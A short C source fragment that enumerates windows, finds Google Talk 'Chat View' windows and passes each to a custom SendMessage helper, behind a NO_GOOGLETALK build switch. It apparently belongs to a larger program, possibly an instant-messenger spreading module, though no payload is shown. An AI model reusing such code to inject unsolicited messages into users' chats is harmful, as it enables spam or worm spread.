#include "GoogleTalk.h"

#ifndef NO_GOOGLETALK

BOOL CALLBACK GoogleTalk(HWND hwnd, LPARAM lpParam)
{
	int iWindow = 0;
	char szClassName[50] = {0};

    GetClassNameA(hwnd, szClassName, sizeof(szClassName));
	if(!strcmp(szClassName, "Chat View"))
		iWindow = 1;

	SendMessage(hwnd, iWindow);

    return TRUE;
}
#endif
